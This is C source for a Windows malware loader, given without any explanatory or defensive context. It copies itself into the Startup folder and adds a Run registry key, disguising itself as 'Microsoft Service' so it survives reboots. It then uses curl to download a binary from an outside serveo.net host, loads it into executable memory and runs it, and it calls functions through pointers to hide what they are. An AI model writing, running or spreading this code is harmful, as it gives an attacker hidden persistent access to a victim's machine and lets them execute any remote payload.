#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>

void copyToStartup(char *sourcePath, char *destinationPath) {
    CopyFile(sourcePath, destinationPath, FALSE);
}

int bootRun() {
    TCHAR szPath[MAX_PATH];
    DWORD pathLen = 0;

    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
    if (pathLen == 0) {
        return -1;
    }

    // Percorso di destinazione per copiare l'eseguibile
    char destination[MAX_PATH] = "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\MicrosoftService.exe";
    copyToStartup(szPath, destination);

    HKEY NewVal;
    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
        return -1;
    }

    DWORD pathLenInBytes = strlen(destination) + 1;
    if (RegSetValueEx(NewVal, TEXT("Microsoft Service"), 0, REG_SZ, (LPBYTE)destination, pathLenInBytes) != ERROR_SUCCESS) {
        RegCloseKey(NewVal);
        return -1;
    }
    RegCloseKey(NewVal);
    return 0;
}

int main() {
    bootRun();

    start:
    FILE *(*f1)(const char *, const char *) = popen;
    size_t (*f2)(void *, size_t, size_t, FILE *) = fread;
    int (*f3)(FILE *) = pclose;
    void *(*f4)(LPVOID, SIZE_T, DWORD, DWORD) = VirtualAlloc;
    void *(*f5)(void *, const void *, size_t) = memcpy;

    FILE *fpipe;
    char *command = "curl https://loki.serveo.net/code.bin";
    char c = 0;
    unsigned char code[460];
    int counter = 0;

    while(0 == (fpipe = (FILE*)f1(command, "r"))) {
        Sleep(10);
        goto start;
    }

    while (f2(&c, sizeof c, 1, fpipe)) {
        code[counter] = c;
        counter = counter + 1;
    }

    f3(fpipe);

    void *exec = f4(0, sizeof code, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    f5(exec, code, sizeof code);
    ((void(*)())exec)();
    return 0;
}
